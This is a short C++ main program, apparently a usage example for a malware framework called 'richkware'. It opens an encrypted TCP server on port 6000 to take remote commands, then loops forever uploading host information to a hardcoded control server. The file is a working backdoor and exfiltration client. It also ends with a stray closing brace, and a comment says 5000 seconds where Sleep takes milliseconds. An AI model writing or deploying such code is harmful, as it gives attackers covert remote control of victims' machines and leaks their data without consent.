
#include <iostream>

#include "richkware.h"

int main() {
     int timeoutUploadInfo = 5000;
    const char *appName = "Richk";
    RmsInfo rmsInfo(
            "richktest",
            "127.0.0.1",
            "8080",
            "Richkware-Manager-Server",
            "richk@i.it"
    );

    // with RichkwareManagerServer
    Richkware richkware(appName, rmsInfo);
    // without RichkwareManagerServer
    //Richkware richkware(appName, defaultEncryptionKey);

    // start server to receive commands from RMC, on port tcp (6000), and with encryption enabled (true)
    richkware.network.server.Start("6000", true);
    // upload information on RMS, every 5000 seconds
    while (true) {
        richkware.network.UploadInfoToRMS("192.168.99.100", "8080", "richk@richk.me");
        Sleep(timeoutUploadInfo);
    }

    return 0;
}


}


